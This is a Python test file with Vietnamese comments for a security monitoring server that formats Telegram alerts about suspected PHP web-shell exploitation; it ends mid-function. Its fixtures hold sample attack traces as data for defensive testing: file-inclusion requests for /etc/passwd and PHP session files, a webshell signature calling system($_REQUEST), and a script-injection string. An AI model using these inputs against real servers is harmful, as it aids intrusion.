def test_merged_rule_id_still_detects_rce():
    """De-dup gộp rule thành "P2S-050,P2S-056": phải tách ra mới thấy RCE."""
    from app.telegram import is_rce

    assert is_rce({"evidence": [{"rule_id": "P2S-050,P2S-056"}]}) is True
    assert is_rce({"evidence": [{"rule_id": "P2S-050,P2S-051"}]}) is False
    # counters path (payload không kèm evidence[])
    assert is_rce({"rules": [{"rule_id": "P2S-056", "hits": 1}]}) is True


def test_format_alert_matches_template():
    """Khung tin nhắn theo yêu cầu operator (bản chốt 1.1.1):

    - KHÔNG còn dòng "Mức độ" (severity chỉ lưu trong DB để lọc).
    - "Cảnh báo" là câu CỐ ĐỊNH cho mọi alert (trước đây gọi là "Sự kiện").
    - Header = "Event logs (x events)" với x = số event THẬT server nhận.
    - Mỗi path một dòng "Path <i>N</i>:", event nằm trong <blockquote>,
      phần timeline trong dòng log được in đậm.
    - Envelope (Dự án/OS/User/Hostname/IP) luôn đủ.
    """
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = {
        "batch_id": "20261025T165000Z",
        "severity": "MODERATE", "hits": 6740,
        "host": "web-01", "user": "www-data", "hostname": "ip-10-0-1-5",
        "lan_ip": "10.0.1.5", "os": "Ubuntu 24.04.1 LTS (Docker)",
        "env": "Docker Container",
        "ts_utc": "2026-10-25T16:50:00Z",
        "window_start": "2026-10-25T16:45:00Z",
        "window_end": "2026-10-25T16:50:00Z",
        "rules": [{"rule_id": "P2S-050", "hits": 4211},
                  {"rule_id": "P2S-017", "hits": 2529}],
        "preview_meta": "6740|2",
        "preview": [
            {"rule_id": "P2S-050", "hits": 4211, "impact": "",
             "source": "access_log",
             "file": "/var/log/nginx/access.log", "line": 4211, "lines": 4211,
             "raw": "203.0.113.42 - - [25/Oct/2026:16:45:01 +0000] \"GET /page.php"
                    "?file=/var/lib/php/sessions/sess_ab12 HTTP/1.1\" 200 5"},
            {"rule_id": "P2S-017", "hits": 2529, "impact": "",
             "source": "access_log",
             "file": "/var/log/nginx/access.log", "line": 12, "lines": 2529,
             "raw": "203.0.113.42 - - [25/Oct/2026:16:46:00 +0000] \"POST /upload.php"
                    " HTTP/1.1\" 200 68 PHP_SESSION_UPLOAD_PROGRESS"},
        ],
    }
    msg = format_alert("prod-shop", alert, ZoneInfo("Asia/Ho_Chi_Minh"))
    lines = msg.split("\n")
    assert lines == [
        "🛡 <b>CENTRAL SECURITY ALERT</b>",
        "📅 <i>25/10/2026 - 23:50</i>",
        "",
        "⚠️ <b>Cảnh báo:</b> Phát hiện nghi vấn khai thác php2Shell",
        "",
        "📦 <b>Dự án:</b> <code>prod-shop</code>",
        "🖥 <b>Môi trường / OS:</b> <b>[Docker Container]</b> <code>Ubuntu 24.04.1 LTS (Docker)</code>",
        "👤 <b>User:</b> <code>www-data</code>",
        "🏷 <b>Hostname:</b> <code>ip-10-0-1-5</code>",
        "🌐 <b>IP LAN:</b> <code>10.0.1.5</code>",
        "",
        "🧩 <b>Event logs (6740 events)</b>",
        "<b>Path:</b> <code>/var/log/nginx/access.log</code>",
        "<blockquote>203.0.113.42 - - <b>[25/Oct/2026:16:45:01 +0000]</b> \"GET /page.php"
        "?file=/var/lib/php/sessions/sess_ab12 HTTP/1.1\" 200 5 ×4211",
        "203.0.113.42 - - <b>[25/Oct/2026:16:46:00 +0000]</b> \"POST /upload.php"
        " HTTP/1.1\" 200 68 PHP_SESSION_UPLOAD_PROGRESS ×2529</blockquote>",
        # 6740 event thật, 2 nhóm đại diện -> phần còn lại phải được nêu, không im lặng
        "<i>… +6738 event</i>",
    ]
    # hai nhóm cùng một path -> MỘT dòng Path, event gộp trong một blockquote
    assert msg.count("<b>Path:</b>") == 1
    # timeline phải in đậm, và chỉ phần timeline
    assert "<b>[25/Oct/2026:16:45:01 +0000]</b>" in msg
    assert "<b>203.0.113.42" not in msg
    # các thành phần đã bỏ: không được xuất hiện trở lại
    for gone in ("Mức độ", "Tổng số Events", "⏱", "🔖", "🔎", "P2S-050", "23:45",
                 "20261025T165000Z", "nhóm", "<code>   "):
        assert gone not in msg, gone


def test_format_alert_container_line():
    """Alert sinh từ log container phải có dòng 🐳 Container (tên container),
    nằm giữa Hostname và IP LAN; alert của host thì KHÔNG có dòng này."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    base = {"severity": "HIGH", "hits": 4, "host": "egghead", "user": "root",
            "hostname": "egghead", "lan_ip": "192.168.22.191",
            "os": "Ubuntu 26.04.1 LTS", "env": "Host",
            "ts_utc": "2026-10-26T08:16:00Z"}
    msg = format_alert("lab-group", dict(base, containers=["php-web", "db-1"]),
                       ZoneInfo("Asia/Ho_Chi_Minh"))
    lines = msg.split("\n")
    assert "🐳 <b>Container:</b> <code>php-web, db-1</code>" in lines
    assert lines.index("🐳 <b>Container:</b> <code>php-web, db-1</code>") == \
        lines.index("🏷 <b>Hostname:</b> <code>egghead</code>") + 1
    assert "🌐 <b>IP LAN:</b> <code>192.168.22.191</code>" in lines

    host_only = format_alert("lab-group", base, ZoneInfo("Asia/Ho_Chi_Minh"))
    assert "🐳" not in host_only
    # quá 5 container thì server vẫn kìm ở 5 (monitor đã cap từ trước)
    many = format_alert("p", dict(base, containers=[f"c{i}" for i in range(9)]),
                        ZoneInfo("UTC"))
    assert many.count(", ") <= 4


def test_format_alert_event_text_is_fixed():
    """Cảnh báo là câu cố định cho MỌI severity — không suy ra từ CRITICAL/INFO."""
    from zoneinfo import ZoneInfo
    from app.telegram import EVENT_TEXT, format_alert

    for sev in ("CRITICAL", "HIGH", "MODERATE", "INFO"):
        alert = {"severity": sev, "hits": 3, "host": "web-01", "user": "www-data",
                 "hostname": "web-01", "lan_ip": "10.0.1.5",
                 "ts_utc": "2026-10-25T16:50:00Z",
                 "preview": [{"rule_id": "P2S-056", "impact": "rce",
                              "file": "/var/www/html/s.php", "line": 0,
                              "raw": "webroot webshell pattern"}]}
        msg = format_alert("prod", alert, ZoneInfo("Asia/Ho_Chi_Minh"))
        assert f"⚠️ <b>Cảnh báo:</b> {EVENT_TEXT}" in msg, sev
        assert "Mức độ" not in msg


# ------------------------------------------- alert Telegram: 1 tin, co giãn
def _alert_with_preview(n_groups=5, raw_len=185, total=2465):
    groups = []
    for i in range(n_groups):
        groups.append({
            "rule_id": "P2S-021", "hits": 1, "severity": "CRITICAL", "impact": "rce",
            "source": "auditd", "file": "/var/log/audit/audit.log", "line": 1000 + i,
            "lines": 1,
            "raw": f"type=EXECVE msg=audit(169862400{i}): " + "z" * (raw_len - 34),
        })
    return {"severity": "CRITICAL", "hits": total, "env": "Host",
            "os": "Ubuntu 24.04.1 LTS", "user": "root", "hostname": "web-01",
            "lan_ip": "10.0.1.5", "ts_utc": "2026-10-26T02:30:00Z",
            "preview": groups, "preview_meta": f"{total}|{n_groups}"}


def test_alert_is_always_exactly_one_message():
    """Mọi mức raw đều chỉ sinh MỘT message — không bao giờ tách tin thứ hai.

    Từng có phương án tách tin khi raw dài; operator bác vì gây nhầm lẫn khi
    theo dõi. format_alert trả str (không phải list) là bất biến.
    """
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    for raw_len in (185, 300, 700, 900, 1500, 3000, 8000):
        msg = format_alert("p", _alert_with_preview(8, raw_len),
                           ZoneInfo("Asia/Ho_Chi_Minh"))
        assert isinstance(msg, str)
        assert msg.count("CENTRAL SECURITY ALERT") == 1, raw_len


def test_alert_never_exceeds_telegram_limit():
    """Budget đo trên độ dài SAU parse entity (Telegram bỏ qua tag HTML)."""
    from zoneinfo import ZoneInfo
    from app.telegram import TG_LIMIT, format_alert, parsed_len

    for raw_len in (185, 300, 700, 900, 1500, 3000, 8000):
        msg = format_alert("p", _alert_with_preview(8, raw_len),
                           ZoneInfo("Asia/Ho_Chi_Minh"))
        assert parsed_len(msg) <= TG_LIMIT, (raw_len, parsed_len(msg))


def test_alert_envelope_never_dropped_for_long_raw():
    """Môi trường/OS/User/Hostname/IP phải còn đủ dù raw dài tới đâu.

    Đây là điểm operator nhấn: thiếu envelope thì không biết server nào bị ảnh
    hưởng. Thiếu chỗ thì CHỈ event logs co lại.
    """
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    for raw_len in (185, 900, 2000, 8000):
        msg = format_alert("prod-shop", _alert_with_preview(8, raw_len),
                           ZoneInfo("Asia/Ho_Chi_Minh"))
        assert "📦 <b>Dự án:</b> <code>prod-shop</code>" in msg, raw_len
        assert "🖥 <b>Môi trường / OS:</b> <b>[Host]</b> <code>Ubuntu 24.04.1 LTS</code>" in msg
        assert "👤 <b>User:</b> <code>root</code>" in msg
        assert "🏷 <b>Hostname:</b> <code>web-01</code>" in msg
        assert "🌐 <b>IP LAN:</b> <code>10.0.1.5</code>" in msg


def test_alert_short_raw_is_verbatim():
    """Raw ngắn (thực tế nginx 185–192 ký tự): hiện NGUYÊN VĂN, không cắt."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = _alert_with_preview(5, 185)
    msg = format_alert("p", alert, ZoneInfo("Asia/Ho_Chi_Minh"))
    # 5 nhóm cùng MỘT path (/var/log/audit/audit.log) -> chỉ 3 event tiêu biểu
    # được hiện (spec: tối đa 3 event/path), và chúng phải NGUYÊN VĂN — raw ngắn
    # không bị cắt ký tự nào.
    # (assert "1 event" / "N events" số ít-số nhiều ở test_spec_* )
    plain = html.unescape(re.sub(r"</?b>", "", msg))
    for g in alert["preview"][:3]:
        assert g["raw"] in plain, g["line"]
    # phần bị ẩn vì vượt trần/path được nêu ở đuôi, không im lặng
    tail = [ln for ln in msg.split("\n") if ln.startswith("<i>…")]
    assert tail and "event" in tail[0], msg
    # raw ngắn không được cắt giữa chừng
    for g in alert["preview"][:3]:
        assert g["raw"] + "…" not in plain


def test_alert_truncates_only_at_limit():
    """Raw dài chạm trần mới bị cắt, và cắt bằng '…' không kèm nhãn."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    msg = format_alert("p", _alert_with_preview(3, 3000), ZoneInfo("Asia/Ho_Chi_Minh"))
    assert "…" in msg
    assert "cắt" not in msg          # không có nhãn "[cắt — xem raw đầy đủ…]"
    assert "xem đủ trên server" not in msg


def test_alert_tail_counts_groups_only():
    """Đuôi khối: '… +N nhóm', không kèm số event."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = _alert_with_preview(8, 900, total=900)
    alert["preview_meta"] = "900|469"        # monitor báo còn 469 nhóm
    msg = format_alert("p", alert, ZoneInfo("Asia/Ho_Chi_Minh"))
    tail = [l for l in msg.split("\n") if l.startswith("<i>…")]
    assert tail, "phải có dòng đuôi khi còn nhóm chưa hiện"
    assert ("path" in tail[0] or "event" in tail[0])
    assert "events)" not in tail[0]


def test_alert_rce_group_sorted_first():
    """Nhóm impact=rce lên đầu, kể cả khi ít hit hơn nhóm scan."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = {
        "severity": "CRITICAL", "hits": 5000, "env": "Host", "os": "Debian 12",
        "user": "www-data", "hostname": "web-01", "lan_ip": "10.0.1.5",
        "ts_utc": "2026-10-26T02:30:00Z", "preview_meta": "5000|2",
        "preview": [
            {"rule_id": "P2S-050", "hits": 4999, "impact": "",
             "file": "/var/log/nginx/access.log", "line": 10, "lines": 4999,
             "raw": "scan line"},
            {"rule_id": "P2S-021", "hits": 1, "impact": "rce",
             "file": "/var/log/audit/audit.log", "line": 20, "lines": 1,
             "raw": 'type=EXECVE a0="sh"'},
        ],
    }
    msg = format_alert("p", alert, ZoneInfo("Asia/Ho_Chi_Minh"))
    assert msg.index("/var/log/audit/audit.log") < msg.index("/var/log/nginx/access.log")


def test_alert_legacy_agent_without_preview():
    """Agent cũ chưa gửi preview: vẫn 1 tin, nêu tên rule + số event THẬT.

    Bản trước in "Event logs (0 nhóm / 0 events)" ở đây. Đó là bug đã gây sự cố
    thật (domain.cnht.vn 02/11/2026): alert CRITICAL 2465 hit mà tin nhắn nói 0.
    """
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = {"severity": "MODERATE", "hits": 3, "env": "Host", "os": "Ubuntu",
             "user": "root", "hostname": "h1", "lan_ip": "10.0.0.2",
             "ts_utc": "2026-10-25T14:35:08Z",
             "rules": [{"rule_id": "P2S-017", "hits": 3}]}
    msg = format_alert("lab-1", alert, ZoneInfo("Asia/Ho_Chi_Minh"))
    # counters: chỉ nêu tổng event (số chắc chắn), không gọi số rule khớp là nhóm
    assert "🧩 <b>Event logs (3 events)</b>" in msg
    assert "0 nhóm / 0 events" not in msg
    assert "Môi trường / OS" in msg


def test_alert_escapes_html_in_raw():
    """Raw chứa < > & không được phá HTML của Telegram."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert, parsed_len

    alert = _alert_with_preview(1, 100)
    alert["preview"][0]["raw"] = '<script>alert(1)</script> & "x"'
    msg = format_alert("p", alert, ZoneInfo("Asia/Ho_Chi_Minh"))
    assert "<script>" not in msg
    assert "&lt;script&gt;" in msg
    assert parsed_len(msg) > 0


# ------------------------------------------------------------ evidence layout
def test_device_label_is_ip_and_hostname_only():
    """Thư mục evidence: IP + hostname. Account không phải một phần danh tính máy."""
    from app.evidence import device_label

    a = {"lan_ip": "192.168.0.2", "hostname": "d2ad89e61d7b", "user": "root"}
    assert device_label(a) == "IP-LAN_192.168.0.2_d2ad89e61d7b"

    # đổi account không được tạo thư mục khác
    b = dict(a, user="www-data")
    assert device_label(a) == device_label(b)

    # thiếu hostname thì lùi về device
    assert device_label({"lan_ip": "10.0.0.5", "device": "web01"}) == "IP-LAN_10.0.0.5_web01"


def test_merge_user_folders_collapses_accounts(tmp_path):
    from app.migrate import merge_user_folders

    p = tmp_path / "lab-1"
    for user, batch in (("root", "20261025T100000Z"), ("root", "20261025T100500Z"),
                        ("www-data", "20261025T101000Z")):
        d = p / f"IP-LAN_192.168.0.2_host1_{user}"
        d.mkdir(parents=True, exist_ok=True)
        (d / f"{batch}.jsonl").write_text(f"{user}-{batch}\n")

    merged = merge_user_folders(tmp_path)
    assert len(merged) == 2

    target = p / "IP-LAN_192.168.0.2_host1"
    assert sorted(f.name for f in target.iterdir()) == [
        "20261025T100000Z.jsonl", "20261025T100500Z.jsonl", "20261025T101000Z.jsonl"]
    assert not (p / "IP-LAN_192.168.0.2_host1_root").exists()
    assert not (p / "IP-LAN_192.168.0.2_host1_www-data").exists()


def test_merge_is_idempotent_and_never_eats_hostname_underscores(tmp_path):
    """Hostname có "_" (web_01_prod) không được bị gộp lại lần nữa."""
    from app.migrate import merge_user_folders

    p = tmp_path / "lab-2"
    d = p / "IP-LAN_10.0.0.5_web_01_prod_www-data"
    d.mkdir(parents=True)
    (d / "20261025T110000Z.jsonl").write_text("x\n")

    assert len(merge_user_folders(tmp_path)) == 1
    target = p / "IP-LAN_10.0.0.5_web_01_prod"
    assert target.is_dir()
    # chạy lại nhiều lần phải không đổi gì
    for _ in range(3):
        assert merge_user_folders(tmp_path) == []
    assert (target / "20261025T110000Z.jsonl").read_text() == "x\n"


def test_merge_keeps_existing_file_on_collision(tmp_path):
    """Cùng batch id ở hai account: giữ bản đã có, không ghi đè."""
    from app.migrate import merge_user_folders

    p = tmp_path / "lab-1"
    for user, body in (("root", "original\n"), ("www-data", "duplicate\n")):
        d = p / f"IP-LAN_192.168.0.2_h_{user}"
        d.mkdir(parents=True)
        (d / "20261025T100000Z.jsonl").write_text(body)

    merge_user_folders(tmp_path)
    assert (p / "IP-LAN_192.168.0.2_h" / "20261025T100000Z.jsonl").read_text() == "original\n"


# ------------------------------------------------- device count at pair time
def test_pair_registers_device_immediately(monkeypatch, tmp_path):
    """Pair xong là /list phải đếm được máy, không chờ alert đầu tiên."""
    from app import db

    dbfile = str(tmp_path / "t.db")
    db.init_db(dbfile)
    pid = db.create_project(dbfile, "new-lab-2", telegram_chat_id="1244302311")
    code = db.issue_pairing_code(dbfile, pid, 600, lambda: "SEC-00000000-0000-0000-0000-000000000001")
    db.auto_link_code(dbfile, code, lambda: "k" * 40, lambda s: s, "fresh-box-01")

    rows = db.projects_by_chat(dbfile, "1244302311")
    assert len(rows) == 1
    assert int(rows[0]["device_count"]) == 1, "thiết bị phải có ngay sau pair"


def test_pair_same_device_twice_counts_once(monkeypatch, tmp_path):
    from app import db

    dbfile = str(tmp_path / "t.db")
    db.init_db(dbfile)
    pid = db.create_project(dbfile, "lab", telegram_chat_id="111")
    for i in range(3):
        code = db.issue_pairing_code(dbfile, pid, 600,
                                     lambda i=i: f"SEC-0000000{i}-0000-0000-0000-000000000001")
        db.auto_link_code(dbfile, code, lambda i=i: f"key{i:0>37}", lambda s: s, "box-01")
    rows = db.projects_by_chat(dbfile, "111")
    assert int(rows[0]["device_count"]) == 1


def test_backfill_devices_from_api_keys(tmp_path):
    """Dự án pair trước bản vá: chỉ có api_keys, không có devices."""
    from app import db, migrate

    dbfile = str(tmp_path / "t.db")
    db.init_db(dbfile)
    pid = db.create_project(dbfile, "old-lab", telegram_chat_id="222")
    # pair trước bản vá: dự án đã linked nhưng chỉ có api_keys, không có devices
    with db.connect(dbfile) as conn:
        conn.execute("UPDATE projects SET status='linked', linked_at=? WHERE id=?",
                     (db.iso(), pid))
        conn.execute("INSERT INTO api_keys (project_id, key_hash, label, created_at)"
                     " VALUES (?,?,?,?)", (pid, "h" * 40, "oldbox", db.iso()))

    assert int(db.projects_by_chat(dbfile, "222")[0]["device_count"]) == 0
    made = migrate.backfill_devices(dbfile)
    assert made == 1
    assert int(db.projects_by_chat(dbfile, "222")[0]["device_count"]) == 1
    # idempotent
    assert migrate.backfill_devices(dbfile) == 0


# ---------------------------------------------------------------------------
# Hồi quy: "alert có hits nhưng tin nhắn báo 0 nhóm / 0 events"
#
# Sự cố thật (domain.cnht.vn, 02/11/2026 14:27): monitor 1.4.2 không gửi
# preview[] (tính năng chỉ có từ 1.4.3), server rơi vào nhánh "agent cũ" và in
# cứng "0 nhóm / 0 events" trong khi batch có 2465 hit — người đọc tưởng monitor
# không thấy gì, trong khi đó chính là batch có P2S-020 (shell đã rơi xuống đĩa).
# ---------------------------------------------------------------------------
def _alert_no_preview(batch="20261102T072700Z", hits=2465):
    return {
        "ts_utc": "2026-11-02T07:27:00Z",
        "batch_id": batch,
        "severity": "CRITICAL",
        "hits": hits,
        "rce": 1,
        "rules": [{"rule_id": "P2S-020", "hits": 1},
                  {"rule_id": "P2S-050", "hits": 2388},
                  {"rule_id": "P2S-051", "hits": 2388},
                  {"rule_id": "P2S-055", "hits": 75}],
        "evidence_file": "/opt/p2s/evidence/x.jsonl",
        "evidence": [],
    }


def test_alert_without_preview_never_claims_zero_events():
    """hits>0 mà không có preview[]: header phải mang số THẬT, không phải 0."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = dict(_alert_no_preview(), user="root", env="Host",
                 os="Ubuntu 24.04.5 LTS", hostname="domain-cnht-vn-toanhc",
                 lan_ip="10.3.64.128")
    msg = format_alert("domain.cnht.vn", alert, ZoneInfo("Asia/Bangkok"))

    # Chỉ còn counters: nêu đúng tổng event đã biết chắc, không gọi số rule khớp
    # là "nhóm" (1 dòng log khớp 2 rule vẫn là 1 event) và không in "×N" của rule
    # (1+2388+2388+75 = 4852 ≠ 2465 vì chồng lấn) — cả hai đều là số sai.
    assert "Event logs (2465 events)" in msg
    assert "0 nhóm / 0 events" not in msg
    assert "nhóm" not in msg.split("Event logs")[1]
    assert "×" not in msg
    # mã rule là chi tiết kỹ thuật, không thuộc khung tin đã chốt
    assert "P2S-" not in msg
    # KHÔNG lộ chi tiết triển khai (preview[], version monitor, tên biến conf)
    # trên tin nhắn thật — người trực ca không cần và không nên thấy.
    assert "preview[]" not in msg
    assert "ALERT_PREVIEW_MAX" not in msg
    assert "monitor &lt;=" not in msg and "1.4.2" not in msg
    # envelope bất biến vẫn còn nguyên
    assert "🌐 <b>IP LAN:</b> <code>10.3.64.128</code>" in msg


def test_alert_preview_disabled_still_reports_counts():
    """ALERT_PREVIEW_MAX=0 -> preview=[] + preview_meta='' : cùng một lỗi cũ."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = dict(_alert_no_preview(), preview=[], preview_meta="",
                 user="root", env="Host", os="Ubuntu 24.04.5 LTS",
                 hostname="h1", lan_ip="10.0.0.2")
    msg = format_alert("p", alert, ZoneInfo("Asia/Bangkok"))
    assert "0 nhóm / 0 events" not in msg
    assert "Event logs (2465 events)" in msg


def test_alert_without_rules_and_without_preview_is_honest():
    """Không rules[] + không preview[]: không bịa nhóm, nhưng vẫn nêu tổng event."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = {"ts_utc": "2026-11-02T07:27:00Z", "severity": "HIGH", "hits": 9,
             "host": "h", "user": "root", "os": "Debian 12", "env": "Host",
             "lan_ip": "10.0.0.3"}
    msg = format_alert("p", alert, ZoneInfo("Asia/Bangkok"))
    # Không có rules[] thì không biết số nhóm -> chỉ nêu tổng event đã biết chắc.
    assert "Event logs (9 events)" in msg
    assert "nhóm" not in msg.split("Event logs")[1].split("\n")[0]
    assert "rules[]" not in msg


def test_ingest_without_evidence_does_not_fabricate_a_null_hit(env):
    """evidence[] rỗng (MAX_EVIDENCE_INLINE=0) KHÔNG được sinh row rác toàn NULL.

    Trước đây mỗi alert như vậy lưu đúng một row alert_hits(rule_id=NULL,
    raw=NULL), nên /alerts/{id} trả về một "event" vô nghĩa và /search không bao
    giờ tìm được gì — dù hit_count thật là 2465.
    """
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)

    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "domain-cnht-vn-toanhc",
                          "lan_ip": "10.3.64.128", "user": "root",
                          "os": "Ubuntu 24.04.5 LTS", "env": "Host",
                          "alerts": [_alert_no_preview()]})
    assert r.status_code == 200, r.text
    aid = r.json()["alerts"][0]["alert_id"]

    detail = client.get(f"/api/v1/alerts/{aid}", headers={"X-API-Key": key}).json()
    assert detail["hit_count"] == 2465
    assert detail["evidence"] == []          # không có raw thì không bịa raw
    with db.connect(cfg.database_path) as conn:
        n = conn.execute("SELECT COUNT(*) FROM alert_hits WHERE alert_id=?",
                         (aid,)).fetchone()[0]
    assert n == 0


def test_ingest_stores_preview_groups_as_hits(env):
    """Có preview[] thì raw line thật được lưu làm hit (kèm cờ truncated)."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(),
                 preview=[{"rule_id": "P2S-020", "hits": 1, "severity": "CRITICAL",
                           "impact": "rce", "source": "webroot",
                           "file": "/var/www/html/s.php", "line": 0, "lines": 0,
                           "raw": "webroot webshell pattern: /var/www/html/s.php"},
                          {"rule_id": "P2S-050,P2S-051", "hits": 2388,
                           "severity": "CRITICAL", "impact": "",
                           "source": "access_log",
                           "file": "/var/log/nginx/access.log", "line": 42,
                           "lines": 2388,
                           "raw": '203.0.113.9 - - "GET /x.php?file=/etc/passwd" 200'}],
                 preview_meta="2465|2")
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "alerts": [alert]})
    assert r.status_code == 200, r.text
    aid = r.json()["alerts"][0]["alert_id"]
    detail = client.get(f"/api/v1/alerts/{aid}", headers={"X-API-Key": key}).json()
    assert [h["rule_id"] for h in detail["evidence"]] == ["P2S-020", "P2S-050,P2S-051"]
    assert detail["evidence"][0]["file"] == "/var/www/html/s.php"
    assert detail["evidence"][1]["line"] == 42
    assert detail["evidence_truncated"] == 1     # preview chỉ là ảnh chụp
    assert detail["hit_count"] == 2465


def test_search_finds_raw_from_preview(env):
    """/search phải tìm được raw thật của batch thiếu evidence[] inline."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(), preview=[
        {"rule_id": "P2S-050", "hits": 2388, "severity": "CRITICAL", "impact": "",
         "source": "access_log", "file": "/var/log/nginx/access.log", "line": 42,
         "lines": 2388,
         "raw": '203.0.113.9 - - "GET /vuln.php?page=/etc/passwd HTTP/1.1" 200'}])
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [alert]})
    hits = client.get("/api/v1/search", params={"q": "/etc/passwd"},
                      headers={"X-API-Key": key}).json()["hits"]
    assert len(hits) == 1
    assert hits[0]["rule_id"] == "P2S-050"


def test_alert_render_from_stored_row_keeps_hit_count():
    """Render lại một alert ĐỌC TỪ DB: row dùng `hit_count`, payload dùng `hits`.

    Thiếu fallback `hit_count` thì mọi lần render lại (ops/dashboard, gửi lại
    tin, test) đều ra "0 events" dù alert lưu 2465 hit — cùng một triệu chứng,
    khác đường vào.
    """
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    row = {"hit_count": 2465, "rules": json.dumps(
        [{"rule_id": "P2S-020", "hits": 1}, {"rule_id": "P2S-050", "hits": 2388}]),
        "severity": "CRITICAL", "hostname": "h", "lan_ip": "10.0.0.2",
        "user": "root", "os": "Ubuntu 24.04.5 LTS", "env": "Host",
        "ts_utc": "2026-11-02T07:27:00Z"}
    msg = format_alert("domain.cnht.vn", row, ZoneInfo("Asia/Bangkok"))
    assert "Event logs (2465 events)" in msg
    assert "0 nhóm / 0 events" not in msg


def test_alert_without_preview_is_short_regardless_of_rule_count():
    """Không có preview: tin chỉ còn envelope + tổng event, không phình theo rule."""
    from zoneinfo import ZoneInfo
    from app.telegram import TG_LIMIT, format_alert, parsed_len

    many = {"ts_utc": "2026-11-02T07:27:00Z", "severity": "HIGH", "hits": 9999,
            "rules": [{"rule_id": f"P2S-{i:03d}", "hits": i} for i in range(1, 60)],
            "user": "root", "os": "Ubuntu", "env": "Host", "hostname": "h",
            "lan_ip": "10.0.0.2"}
    msg = format_alert("p", many, ZoneInfo("Asia/Bangkok"))
    assert parsed_len(msg) <= TG_LIMIT
    assert "Event logs (9999 events)" in msg
    assert "P2S-" not in msg            # không liệt kê mã rule
    assert msg.count("CENTRAL SECURITY ALERT") == 1


# ---------------------------------------------------------------------------
# Vá cho dự án còn ở monitor <= 1.4.2 (không gửi preview[]):
# raw event đã nằm trên server trong evidence mirror — phải đọc lại được.
# ---------------------------------------------------------------------------
def _write_mirror(cfg, project, alert, records):
    """Ghi file evidence y như /ingest-evidence làm (đường dẫn + nội dung)."""
    path = evidence.evidence_path(cfg, project, evidence.device_label(alert),
                                  alert["batch_id"])
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    return path


def _old_monitor_records(n=3):
    return [{
        "ts_utc": "2026-11-02T07:26:59Z", "rule_id": "P2S-020", "severity": "CRITICAL",
        "impact": "rce", "source": "webroot", "file": "/var/www/html/s.php",
        "line": 0, "ip": "", "method": "", "uri": "", "status": "", "ua": "",
        "pid": "", "raw": "webroot webshell pattern: /var/www/html/s.php contains 'system($_REQUEST'",
    }] + [{
        "ts_utc": f"2026-11-02T07:27:0{i}Z", "rule_id": "P2S-050,P2S-051",
        "severity": "CRITICAL", "impact": "", "source": "access_log",
        "file": "/var/log/nginx/access.log", "line": 369560 + i, "ip": "203.0.113.9",
        "method": "GET", "uri": "/vuln.php?page=/var/lib/php/sessions/sess_abc",
        "status": "200", "ua": "curl/8.5", "pid": "",
        "raw": f'203.0.113.9 - - [02/Nov/2026:07:27:0{i} +0000] "GET /vuln.php?page=/var/lib/php/sessions/sess_abc HTTP/1.1" 200 41',
    } for i in range(n)]


def test_old_monitor_alert_gets_raw_from_evidence_mirror(env):
    """Monitor 1.4.2: alert không preview[], nhưng evidence đã lên -> tin có raw."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(batch="20261102T072700Z"),
                 device="domain-cnht-vn-toanhc")
    alert["lan_ip"] = "10.3.64.128"
    _write_mirror(cfg, "khach-hang-a", alert, _old_monitor_records(3))

    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "domain-cnht-vn-toanhc", "lan_ip": "10.3.64.128",
                          "user": "root", "os": "Ubuntu 24.04.5 LTS", "env": "Host",
                          "alerts": [alert]})
    assert r.status_code == 200, r.text
    text = tg.sent[-1][1]

    # có raw thật, và nhóm RCE đứng đầu (dù chỉ 1 hit)
    assert "/var/www/html/s.php" in text
    assert "webroot webshell pattern" in text
    assert text.index("/var/www/html/s.php") < text.index("/var/log/nginx/access.log")
    # gộp trùng: 3 dòng access log chỉ khác ts/sess -> 1 nhóm; tổng event vẫn
    # là con số THẬT của batch (2465), preview chỉ hiện 2 nhóm đại diện.
    assert "Event logs (" in text and " events)" in text
    assert "0 nhóm / 0 events" not in text


def test_alert_without_raw_is_not_sent(env):
    """Chưa có evidence: KHÔNG gửi Telegram, alert vào hàng đợi gửi bù.

    Nghiệp vụ: alert phải kèm raw (bằng chứng). Tin chỉ có "N events" mà không
    có dòng log nào khiến sysadmin hiểu nhầm — thà chậm vài giây còn hơn gửi
    một cảnh báo không hành động được.
    """
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "alerts": [_alert_no_preview()]})
    assert r.status_code == 200
    body = r.json()
    assert body["deferred"] == 1 and body["messages"] == 0 and body["delivered"] == 0
    assert tg.sent == []                       # KHÔNG có tin nào
    assert body["alerts"][0]["status"] == "stored"   # nhưng alert vẫn được lưu
    with db.connect(cfg.database_path) as conn:
        row = conn.execute("SELECT messages, delivered FROM alerts").fetchone()
    assert (row["messages"], row["delivered"]) == (0, 0)


def test_old_monitor_alert_stores_real_hits(env):
    """alert_hits phải có raw thật (không phải row NULL) để /search tìm được."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(batch="20261102T073000Z"), lan_ip="10.3.64.128")
